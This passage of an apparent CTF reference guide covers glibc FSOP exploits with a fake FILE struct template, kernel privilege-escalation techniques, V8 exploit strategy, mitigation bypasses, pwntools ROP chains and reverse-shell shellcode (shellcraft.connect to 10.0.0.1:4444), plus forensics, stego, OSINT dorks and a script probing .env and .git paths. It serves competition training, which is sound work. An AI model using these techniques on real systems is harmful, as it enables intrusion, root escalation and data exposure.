  +0x68: _chain          (pointer)   → next FILE in list
  +0x70: _fileno         (int)
  +0x78: _flags2         (int)
  +0x80: _old_offset     (long)
  +0x88: _cur_column + _vtable_offset + _shortbuf
  +0x90: _lock           (pointer)
  +0x98: _offset         (long long)
  +0xa0: _codecvt        (pointer)
  +0xa8: _wide_data      (pointer)   → _IO_wide_data
  +0xb0: _freeres_list   (pointer)
  +0xb8: _freeres_buf    (pointer)
  +0xc0: __pad5          (size_t)
  +0xc8: _mode           (int)
  +0xcc: _unused2        (20 bytes)
  
_IO_FILE_plus (+0xd8): vtable pointer
"""

def fsop_exit_hijack():
    """
    When program exits, _IO_flush_all_lockp is called.
    It iterates through _IO_list_all (linked via _chain),
    calling _IO_OVERFLOW(fp, EOF) on each.
    
    Attack:
    1. Corrupt a FILE struct (or create a fake one)
    2. Set _chain to point into _IO_list_all
    3. Set vtable to fake table with _IO_OVERFLOW → system
    4. Program exits → system("/bin/sh")!
    """
    pass

def fsop_vtable_bypass():
    """
    glibc 2.24+: vtable pointer is validated! Must be within __libc_IO_vtables section.
    
    Bypasses:
    1. _IO_str_jumps: within valid range, _IO_str_overflow calls → controlled function
    2. _IO_wstr_jumps: similar, wide-char variant
    3. _IO_cookie_jumps: _IO_cookie_read/write call function pointers from FILE struct
    
    House of Apple technique: use _IO_wfile_overflow path,
    which calls _IO_switch_to_wget_mode → calls wide_data's vtable function.
    """
    pass
```

### FSOP Exploit Template

```python
def fsop_exploit_template():
    """Complete FSOP exploit chain."""
    from pwn import *
    
    # Step 1: Get libc leak (for vtable section bounds)
    libc_base = leak_libc_base()
    
    # Step 2: Craft fake FILE struct
    fake_file = b''
    fake_file += p32(0xFBAD2887)       # _flags: MAGIC | _IO_IS_APPENDING | _IO_CURRENTLY_PUTTING | _IO_LINKED
    fake_file += p64(0) * 7            # read/write pointers (unused for overwrite path)
    fake_file += p64(0)                 # _IO_buf_base
    fake_file += p64(1)                 # _IO_buf_end (must be > _IO_buf_base)
    fake_file += p64(0) * 4            # save_base, backup_base, save_end, markers
    fake_file += p64(0)                 # _chain (next FILE pointer, can be 0 to stop iteration)
    fake_file += p32(0)                 # _fileno
    fake_file += p32(0)                 # _flags2
    fake_file += p64(0)                 # _old_offset
    fake_file += p16(0)                 # _cur_column
    fake_file += b'\x00'                # _vtable_offset
    fake_file += b'\x00'                # _shortbuf[0]
    fake_file += p64(0) * 4            # _lock, _offset, _codecvt, _wide_data
    fake_file += p64(0) * 3            # _freeres_list, _freeres_buf, __pad5
    fake_file += p32(0)                 # _mode
    fake_file += b'\x00' * 20           # _unused2
    fake_file += p64(libc_base + _IO_wfile_jumps_offset)  # vtable → _IO_wfile_jumps
    
    # Step 3: Set up _wide_data for House of Apple
    fake_wide_data = b''
    fake_wide_data += p64(0) * 6       # _IO_read/write ptr/base/end
    fake_wide_data += p64(libc_base + _IO_wfile_jumps_offset)  # wide vtable → trigger path
    
    # Step 4: Overwrite _IO_list_all → fake_file
    # Step 5: Trigger exit or return from main
    pass
```

---

## Kernel Exploitation

### Kernel PWN Setup

```python
# Typical kernel CTF challenge setup:
# - bzImage (kernel) + initramfs.cpio (filesystem)
# - QEMU with -append for SMEP/SMAP/KPTI flags
# - Provided: exploit.c that runs as root via /init script

KERNEL_MITIGATIONS = {
    'KASLR': 'Kernel ASLR — leak kernel base via /proc/kallsyms, dmesg, or side channels',
    'SMEP': 'Supervisor Mode Execution Prevention — can\'t execute user-space code in kernel mode',
    'SMAP': 'Supervisor Mode Access Prevention — can\'t access user-space data in kernel mode',
    'KPTI': 'Kernel Page Table Isolation — user-space pages unmapped in kernel mode',
    'FG-KASLR': 'Function-granular KASLR — each function randomized independently',
    'Stack Canary': 'Kernel stack protector — same principle as user-space canary',
    'KCFI': 'Kernel Control Flow Integrity — forward-edge indirect call protection',
}

def kernel_exploit_ret2usr():
    """Simplest kernel exploit: return to user-space shellcode."""
    """
    1. mmap user page at fixed address (e.g., 0xdead000)
    2. Write shellcode: commit_creds(prepare_kernel_cred(0)); ret2user
    3. Trigger kernel vulnerability to hijack RIP → user page
    4. Shellcode runs with kernel privileges
    5. Return to user mode → root shell
    
    NOTE: Broken by SMEP! Use kernel ROP instead.
    """
    pass

def kernel_rop():
    """Kernel ROP when SMEP prevents ret2usr."""
    """
    1. Leak kernel base (via /proc/kallsyms or side channel)
    2. Find gadgets in vmlinux (ROPgadget)
    3. Chain: prepare_kernel_cred(0) → commit_creds → swapgs → iretq → user-mode
    
    x86_64 iretq frame (for returning to user mode):
    struct iretq_frame {
        uint64_t rip;     // user-space code
        uint64_t cs;      // user code segment (0x33 for 64-bit)
        uint64_t rflags;  // saved flags
        uint64_t rsp;     // user stack
        uint64_t ss;      // user data segment (0x2b)
    };
    """
    pass
```

### Kernel Exploit Techniques

```python
KERNEL_TECHNIQUES = {
    'modprobe_path': """
        Overwrite /proc/sys/kernel/modprobe_path (default: /sbin/modprobe).
        When kernel needs to load a module, it calls this path as root.
        1. Create fake binary at /tmp/evil with: chmod +x, copies flag or spawns shell
        2. Overwrite modprobe_path → "/tmp/evil"
        3. Trigger: execve a file with unknown binary format header
        4. Kernel calls /tmp/evil as root!
        
        Requires: kernel arbitrary write (no SMAP/SMEP bypass needed!)
    """,
    
    'cred_overwrite': """
        Overwrite current task's credentials to root (uid=0, gid=0).
        struct cred contains: uid, gid, euid, egid, etc.
        1. Find current task_struct (via stack or per-CPU variable)
        2. Follow pointer chain: task_struct → cred
        3. Overwrite uid/gid/euid/egid → 0 (root)
        
        Requires: arbitrary read/write in kernel memory
    """,
    
    'pipe_buffer': """
        Exploit pipe_buffer structures for arbitrary read/write.
        pipe_buf_operations contains function pointers.
        Overwrite → call arbitrary kernel function.
        
        Used in Dirty Pipe (CVE-2022-0847).
    """,
    
    'tty_struct': """
        Classic kernel exploitation target.
        tty_struct contains function pointer table (tty_operations).
        Overwrite → when user interacts with tty, kernel calls our function.
        Mostly mitigated now with hardened usercopy and heap isolation.
    """,
    
    'nftables/USB/netlink': """
        Attack kernel subsystems with complex state machines.
        CVE-2022-1015 (nftables), CVE-2022-25636 (netfilter).
        These often involve type confusion or OOB in kernel netlink handlers.
    """,
}

def kernel_heap_exploitation():
    """
    Kernel heap allocators: SLUB, SLAB, SLOB (deprecated).
    
    SLUB: slab allocator with per-CPU caches.
    Freelist stored in freed objects (like tcache but in kernel!).
    
    Techniques:
    - Freelist corruption → allocate object over target
    - Cross-cache overflow (rare but possible)
    - Use-after-free on kernel objects
    - msg_msg spraying (heap spray via System V message queues)
    - keyctl spraying (spray via keyctl subsystem)
    """
    pass
```

---

## V8/Browser Exploitation

```python
V8_EXPLOITATION = {
    'type_confusion': """
        Most common V8 vulnerability class (6+ Chrome zero-days in 2025!).
        V8 uses "Maps" (hidden classes) to track object layout.
        Type confusion: object is created with Map A, but accessed as Map B.
        
        Example: TransitionElementsKind missing aliasing check (CVE-2025-2135).
        - Array transitions from PACKED_SMI to PACKED_DOUBLE without rechecking
        - Attacker exploits stale Map info to read/write arbitrary memory
        
        Exploitation strategy:
        1. Create addrof primitive: leak object address
        2. Create fakeobj primitive: forge arbitrary object at known address
        3. Overwrite ArrayBuffer backing store pointer → arbitrary RW
        4. Corrupt WASM RWX page → shellcode execution
    """,
    
    'JIT_spraying': """
        Force JIT compiler to emit shellcode as "constants" in JIT code pages.
        WASM RWX pages are common targets (marked executable).
        Use large constants (0x90909090...) that decode to valid instructions.
        Jump into middle of JIT code → execute attacker shellcode.
        Mitigated: V8 heap sandbox, WASM memory protection.
    """,
    
    'sandbox_escape': """
        Modern Chrome requires 3-bug chain:
        1. V8 type confusion → renderer RCE
        2. V8 sandbox bypass → escape heap cage (e.g., corrupt API object outside sandbox)
        3. Mojo IPC abuse → sandbox escape to OS (CVE-2025-2783 FileSystemAccess logic bug)
        
        Mojo: Chrome's IPC system between renderer and browser process.
        Sandbox escape via: Mojo interface fuzzing, logical bugs in privileged APIs.
    """,
}
```

---

## Mitigation Bypass Techniques

```python
MITIGATION_BYPASS = {
    'NX/DEP': {
        'desc': 'Non-executable stack/heap',
        'bypass': 'ROP/JOP (reuse existing code), ret2libc, mprotect to re-enable',
    },
    'ASLR': {
        'desc': 'Randomized base addresses',
        'bypass': 'Info leak (format string, UAF, OOB), partial overwrite, brute force (32-bit), side channel',
    },
    'PIE': {
        'desc': 'Position-independent executable (ASLR for binary)',
        'bypass': 'PIE leak (same as ASLR), partial overwrite on return addr (2 bytes on x86_64), _dl_fixup tricks',
    },
    'Stack Canary': {
        'desc': 'Random value before return address, checked before ret',
        'bypass': 'Leak canary via format string/OOB, brute force (fork server), master canary overwrite (TLS), SSP leak via __stack_chk_fail message',
    },
    'Full RELRO': {
        'desc': 'GOT is read-only',
        'bypass': 'Target __malloc_hook/__free_hook (glibc < 2.34), vtable/function pointers, libc GOT (if writable), destructor array (.fini_array)',
    },
    'CFI': {
        'desc': 'Control Flow Integrity (clang CFI, MS Control Flow Guard)',
        'bypass': 'COOP (Counterfeit Object-oriented Programming), reuse allowed targets, corrupt virtual call dispatch',
    },
    'CET/Shadow Stack': {
        'desc': 'Hardware-enforced shadow stack (Intel CET)',
        'bypass': 'Target data pointers instead of return addresses, corrupt exception handlers, signal frame manipulation',
    },
    'SEHOP': {
        'desc': 'Structured Exception Handler Overwrite Protection (Windows)',
        'bypass': 'Overwrite final exception handler, use vectored exception handlers',
    },
}

# Format String — Canary + PIE Bypass
def format_string_full_bypass():
    """
    Single format string vulnerability can bypass BOTH canary and PIE:
    
    1. Leak stack canary: %N$p where N is canary's position on stack
    2. Leak PIE base: %M$p where M is return address position (contains code addr)
    3. Leak libc: %L$p for libc return address (__libc_start_main+offset)
    4. Now craft payload with correct canary + ROP chain
    """
    from pwn import *
    
    # Example fmtstr payload generation
    def fmtstr_payload(offset, writes, written=0):
        """Generate format string payload for arbitrary write."""
        payload = b''
        for addr, value in writes.items():
            # Write value to addr using %n
            pass
        return payload

# Partial Overwrite Bypass
def partial_overwrite_bypass():
    """
    ASLR randomizes high bytes but low 12 bits of page offsets are fixed.
    On x86_64, only 4 bits of address within a page are randomized.
    
    Partial overwrite (e.g., overwrite last 1-2 bytes of return address):
    - Success probability: 1/16 for 1 byte, 1/4096 for 2 bytes
    
    Useful when: write primitive is limited, or when avoiding full overwrite
    that would require known addresses.
    """
    pass

# GOT Overwrite with Partial RELRO
def got_overwrite():
    """
    Partial RELRO: GOT is writable.
    1. Overwrite printf@GOT → system
    2. Call printf("/bin/sh") → system("/bin/sh")!
    
    Full RELRO: GOT is read-only after loading.
    Alternatives: __malloc_hook (glibc < 2.34), __free_hook, .fini_array, _dl_fini
    """
    pass
```

---

## Integer Overflow & Type Confusion

```python
# Integer Overflow Exploitation
def integer_overflow_exploit():
    """
    Common patterns:
    1. Signed/unsigned confusion:
       if (size < MAX) { buf = malloc(size + 1); } // size=-1 → malloc(0)
    
    2. Integer overflow in size calculation:
       malloc(count * element_size) // count=0x40000001, esize=4 → malloc(4)
       Then copy count*esize bytes → heap overflow!
    
    3. Truncation:
       size_t → int → small value → short allocation + long copy
    """
    
    # Check for overflow
    def safe_mult(a, b, max_val=2**64-1):
        """Check if a*b overflows 64-bit."""
        if a == 0 or b == 0:
            return True, 0
        result = a * b
        return result // a == b, result
    
    # Exploitation:
    # Integer overflow → small allocation → heap overflow into adjacent chunk

# Type Confusion in C++
def cpp_type_confusion():
    """
    C++ type confusion through illegal downcasting:
    
    class Base { int x; };
    class Child1 : public Base { int y; virtual void print(); };
    class Child2 : public Base { char cmd[32]; virtual void exec(); };
    
    Child1* c1 = new Child1();
    Child2* c2 = static_cast<Child2*>((Base*)c1);  // TYPE CONFUSION!
    c2->exec();  // Executes from wrong vtable → controlled execution!
    
    Exploitation:
    1. Create type confusion (via buffer overflow, UAF, incorrect casting)
    2. Overlap vtable pointer with controlled data
    3. Call virtual function → RIP control
    """
    pass

# COOP — Counterfeit Object-oriented Programming
def coop_attack():
    """
    Bypass CFI by reusing VALID virtual function targets.
    
    Instead of hijacking to arbitrary code, hijack to OTHER valid
    virtual functions that together form a malicious computation.
    
    Challenges: finding gadgets in vtable, chaining without direct RIP control.
    """
    pass
```

---

## Cross-Architecture PWN

```python
ARCH_DIFFERENCES = {
    'x86_64': {
        'call_conv': 'System V AMD64: rdi,rsi,rdx,rcx,r8,r9 (stack for rest)',
        'ret': 'ret pops 8 bytes from stack → rip',
        'stack': 'Grows downward, 16-byte aligned before call',
    },
    'ARM32': {
        'call_conv': 'r0-r3 for args, LR (r14) for return address',
        'ret': 'pop {pc} or bx lr — NO dedicated ret instruction!',
        'thumb': 'Thumb mode: bit 0 of address = 1, 16-bit instructions',
    },
    'AArch64': {
        'call_conv': 'x0-x7 for args, x30 (LR) for return',
        'ret': 'ret uses x30 — overwrite LR then trigger ret',
        'pac': 'Pointer Authentication (PAC) on ARMv8.3+ — sign/verify return addresses',
    },
    'MIPS': {
        'call_conv': '$a0-$a3 for args, $ra for return',
        'delay_slot': 'Instruction AFTER branch executes before branch takes effect!',
        'cache': 'Separate I-cache and D-cache — need cache flush after code modification',
    },
    'RISC-V': {
        'call_conv': 'a0-a7 for args, ra for return',
        'compress': 'C extension: 16-bit compressed instructions',
        'no_flags': 'No condition flags — branch on register comparison',
    },
}

# ARM32 ROP specifics
def arm32_rop_notes():
    """
    - Gadgets end with: pop {pc}, bx lr, pop {..., pc}
    - Need to handle Thumb mode (bit 0 address)
    - System call: SVC 0 (supervisor call), syscall number in r7
    - execve("/bin/sh", 0, 0): r7=11, r0="/bin/sh", r1=0, r2=0, SVC 0
    """
    pass

# MIPS ROP specifics  
def mips_rop_notes():
    """
    - Delay slot: instruction after jump executes BEFORE jump
    - GOT is ALWAYS at a fixed offset from .text (no full ASLR on many MIPS systems)
    - Stack finders: gadget to move $sp to controlled heap area
    - Cache coherency: after writing shellcode, flush D-cache+I-cache for execution
    """
    pass
```

---

## pwntools Advanced Usage

```python
# Pwntools power techniques
from pwn import *

# Auto-context
context.arch = 'amd64'
context.os = 'linux'
context.log_level = 'debug'  # see all sent/received data

# Process/Remote
# p = process('./binary', env={'LD_PRELOAD': './libc.so.6'})
# p = remote('ctf.example.com', 1337)

# Advanced ROP building
elf = ELF('./binary')
libc = ELF('./libc.so.6')
rop = ROP(elf)

# Find specific gadgets
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
syscall = rop.find_gadget(['syscall', 'ret'])[0]

# Automatic ROP chain building
rop.system(b'/bin/sh\x00')  # auto-finds gadgets!

# Shellcraft
shellcode = shellcraft.sh()  # or shellcraft.amd64.linux.sh()
shellcode = shellcraft.cat('flag.txt')
shellcode = shellcraft.connect('10.0.0.1', 4444) + shellcraft.dupio()

# Format string helpers
payload = fmtstr_payload(6, {target_addr: 0xdeadbeef})

# DynELF — remote library resolver
def leak(addr):
    # read 8 bytes from arbitrary address
    p.send(p64(addr))
    return u64(p.recv(8))

d = DynELF(leak, elf=elf)
system_addr = d.lookup('system', 'libc')

# FmtStr — format string automation
execve_bin_sh = FmtStr(exec_fmt, offset=6)

# Corefile analysis
core = Core('./core')
print(f'RIP: {hex(core.rip)}')
print(f'RSP: {hex(core.rsp)}')
stack = core.stack  # read stack contents at crash

# GDB integration
# gdb.attach(p, '''
# b *0x400123
# continue
# ''')

# Cyclic pattern
offset = cyclic_find(0x61616174)  # find offset from crash value

# Flat — layout payloads cleanly
payload = flat({
    0: b'A' * offset,
    offset: p64(pop_rdi),
    offset + 8: p64(bin_sh),
    offset + 16: p64(system_addr),
})

# Logging
log.info(f'libc base: {hex(libc_base)}')
log.success('Exploit worked!')
log.warning('Partial success')
log.error('Exploit failed!')
```

---

## GDB/pwndbg Advanced

```python
GDB_COMMANDS = {
    'analysis': [
        'checksec — check binary protections at runtime',
        'vmmap — memory mappings (ASLR verification)',
        'vis_heap_chunks — visual heap layout (pwndbg)',
        'arenas — show heap arenas',
        'bins — show all free bins (tcache, fastbin, unsortedbin, smallbin, largebin)',
        'telescope $rsp 50 — view stack with pointer resolution',
        'context — show registers, stack, code, backtrace (auto-refresh)',
    ],
    'exploitation': [
        'search "/bin/sh" — find string in memory',
        'find_fake_fast 0x7ffe1234 0x80 — find fake chunk near address',
        'parseheap — parse heap metadata',
        'ropgadget <regex> — search ROP gadgets in memory',
        'fsbase / gsbase — read TLS (canary is at fs:0x28 on x86_64)',
    ],
    'debugging': [
        'b *0x400123 if $rdi==0xdead — conditional breakpoint',
        'commands → set breakpoint auto-commands',
        'watch *(long*)0x601018 — hardware watchpoint',
        'rwatch — read watchpoint',
        'record full → reverse-step — reverse execution!',
    ],
}

# Pwndbg-specific tricks
PWNTOOLS_GDB = """
# Load .gdbinit for pwndbg
echo "source /path/to/pwndbg/gdbinit.py" >> ~/.gdbinit

# Common pwndbg settings
set context-sections 'regs disasm code stack backtrace'
set show-flags on
set show-retaddr on
set hexdump-width 16
"""
```

---

## FORENSICS

### File Analysis

```bash
# Identify file type
file unknown
binwalk unknown        # find embedded files
xxd unknown | head     # hex dump

# Extract embedded files
binwalk -e unknown     # auto-extract
foremost unknown       # file carving

# Search for flags
strings unknown | grep -i 'flag{'
strings unknown | grep -i 'ctf{'
strings -e l unknown   # 16-bit little-endian
strings -e b unknown   # 16-bit big-endian
```

### Memory Forensics (Volatility)

```bash
# Identify profile
volatility -f memory.dmp imageinfo

# Process list
volatility -f memory.dmp --profile=Win7SP1x64 pslist
volatility -f memory.dmp --profile=Win7SP1x64 pstree

# Command history
volatility -f memory.dmp --profile=Win7SP1x64 cmdscan
volatility -f memory.dmp --profile=Win7SP1x64 consoles

# Dump process memory
volatility -f memory.dmp --profile=Win7SP1x64 memdump -p <PID> -D out/

# Find strings in memory dump
strings out/<PID>.dmp | grep -i flag

# Network connections
volatility -f memory.dmp --profile=Win7SP1x64 netscan

# Registry
volatility -f memory.dmp --profile=Win7SP1x64 hivelist
volatility -f memory.dmp --profile=Win7SP1x64 printkey -K "SAM\\Domains\\Account\\Users"
```

### PCAP / Network Forensics

```bash
# Wireshark / tshark analysis
tshark -r capture.pcap -Y "http" -T fields -e http.host -e http.request.uri
tshark -r capture.pcap -Y "dns" -T fields -e dns.qry.name
tshark -r capture.pcap -Y "ftp" -T fields -e ftp.request.command -e ftp.request.arg

# Extract files from HTTP
tshark -r capture.pcap --export-objects http,/tmp/extracted/

# Follow TCP stream
tshark -r capture.pcap -q -z follow,tcp,ascii,0

# Extract data from ICMP
tshark -r capture.pcap -Y "icmp" -T fields -e data.data
```

### Disk Forensics

```bash
# Mount disk image
mount -o ro,loop disk.img /mnt/analysis

# Deleted file recovery
testdisk disk.img
photorec disk.img

# NTFS analysis
fls -r disk.img
icat disk.img <inode>

# EXT4 analysis
debugfs disk.img
  ls -la /
  cat /path/to/file

# Find hidden files
find /mnt/analysis -name ".*" -type f
getfattr -d -m - /mnt/analysis/*
```

---

## STEGANOGRAPHY

### Image Steganography

```python
# LSB extraction
from PIL import Image

def extract_lsb(image_path: str) -> bytes:
    """Extract LSB from each color channel."""
    img = Image.open(image_path)
    pixels = list(img.getdata())
    
    bits = []
    for pixel in pixels:
        for channel in pixel[:3]:  # R, G, B
            bits.append(str(channel & 1))
    
    # Convert bits to bytes
    data = bytearray()
    for i in range(0, len(bits) - 7, 8):
        byte = int(''.join(bits[i:i+8]), 2)
        data.append(byte)
    
    return bytes(data)

# Common stego tools
STEGO_TOOLS = {
    'steghide': 'steghide extract -sf image.jpg',
    'zsteg': 'zsteg -a image.png',  # PNG/BMP LSB analysis
    'stegsolve': 'Visual analysis with bit plane filters',
    'exiftool': 'exiftool image.jpg',  # metadata
    'binwalk': 'binwalk -e image.jpg',  # embedded files
    'strings': 'strings image.png | grep flag',
    'pngcheck': 'pngcheck -v image.png',  # PNG chunk analysis
}
```

### Audio Steganography

```bash
# Spectrogram analysis
sox audio.wav -n spectrogram -o spectrogram.png

# LSB extraction from WAV
# Python: wave module to read samples, extract LSBs

# DTMF tones (phone keypad tones)
multimon-ng -t wav audio.wav

# SSTV (Slow Scan TV — radio CTF)
# Use QSSTV or mmsstv
```

### Other Stego Techniques

```python
STEGO_CHECKS = [
    'Check file size — can embed data by appending after EOF',
    'Check for multiple files (binwalk, foremost, 7z l)',
    'Check color palette (PNG palette stego)',
    'Check for zero-width characters in text',
    'Check for whitespace steganography (tabs vs spaces)',
    'Check for custom font encoding',
    'Check for Braille/Unicode hidden messages',
    'Check pixel value differences between similar images',
]
```

---

## OSINT (in CTF Context)

```python
OSINT_CHECKS = [
    'Google Image Search — reverse image search',
    'Shodan — find exposed services by banner',
    'WHOIS — domain registration details',
    'crt.sh — SSL certificate transparency logs',
    'Wayback Machine — historical versions of websites',
    'GitHub search — code commits, gists, comments',
    'EXIF data — GPS coordinates, camera info, timestamps',
    'Social media — Twitter, LinkedIn, Instagram, Reddit',
    'HaveIBeenPwned — email/password breach data',
    'Wigle.net — WiFi network geolocation',
]

# Google dorking for CTF OSINT
CTF_DORKS = {
    'github_flag': 'site:github.com "flag{" ',
    'pastebin': 'site:pastebin.com "ctf{" ',
    'twitter': 'from:@target_user since:2024-01-01',
    'linkedin': 'site:linkedin.com/in/ "ctf" "target"',
}
```

---

## CTF Automation Script

```python
#!/usr/bin/env python3
"""CTF auto-solver helper — try common patterns."""

import requests
import re
import base64
import sys

def auto_try_web(url: str):
    """Quick web challenge analysis."""
    results = {}
    
    # Get page
    r = requests.get(url)
    html = r.text
    
    # Check for flags in source
    flag_patterns = [
        r'flag\{[^}]+\}', r'CTF\{[^}]+\}', r'ctf\{[^}]+\}',
        r'FLAG\{[^}]+\}', r'answer\{[^}]+\}',
    ]
    for pattern in flag_patterns:
        match = re.search(pattern, html)
        if match:
            results['flag_in_source'] = match.group()
    
    # Check common endpoints
    for path in ['robots.txt', '.git/HEAD', '.env', 'flag.txt', 'flag', 
                 'admin', 'backup', '.svn/entries', '.DS_Store']:
        try:
            r2 = requests.get(f'{url.rstrip("/")}/{path}', timeout=5)
            if r2.status_code == 200:
                results[f'found_{path}'] = r2.text[:500]
        except:
            pass
    
    # Check HTTP headers
    for header in ['X-Flag', 'Flag', 'X-CTF-Flag', 'X-Hint']:
        if header in r.headers:
            results[f'flag_in_header_{header}'] = r.headers[header]
    
    # Check cookies
    for cookie in r.cookies:
        flag_match = re.search(r'flag\{[^}]+\}', cookie.value)
        if flag_match:
            results['flag_in_cookie'] = flag_match.group()
    
    return results

# Quick crypto brute force
def try_common_crypto(ciphertext: str):
    """Try common crypto on ciphertext."""
    results = []
    
    # Caesar (all shifts)
    for shift in range(1, 26):
        decoded = caesar(ciphertext, -shift)
        if 'flag' in decoded.lower() or 'ctf' in decoded.lower():
            results.append(('caesar', shift, decoded))
    
    # Base64
    try:
        decoded = base64.b64decode(ciphertext)
        if b'flag' in decoded.lower() or b'ctf' in decoded.lower():
            results.append(('base64', 0, decoded))
    except:
        pass
    
    # ROT13
    decoded = caesar(ciphertext, 13)
    if 'flag' in decoded.lower():
        results.append(('rot13', 13, decoded))
    
    return results
```

---

## Deep Knowledge References

- **references/hacktricks-complete.md** — Massive HackTricks knowledge base (57,258 lines, 139 READMEs) covering binary exploitation (ROP, heap, format strings), cryptography (RSA, ECC, AES, padding oracles), forensics (memory, disk, network), and more — essential for CTF binary exploitation + crypto + forensics sections.

---

## Pitfalls

- **Time management**: Web challenges are usually fastest — start there first
- **Dependency hell**: Have a Docker container with all tools pre-installed
- **Rabbit holes**: Set a 30-min timebox per challenge before asking for hints
- **Team communication**: Use shared notes/dashboard for tracking which challenges are solved
- **Flag format**: Always check the expected flag format (`flag{...}` vs `CTF{...}` vs custom)
- **Anti-cheat**: Don't attack CTF infrastructure — stay within challenge scope
- **Write-ups**: Save exploit scripts immediately — you'll need them for write-ups later
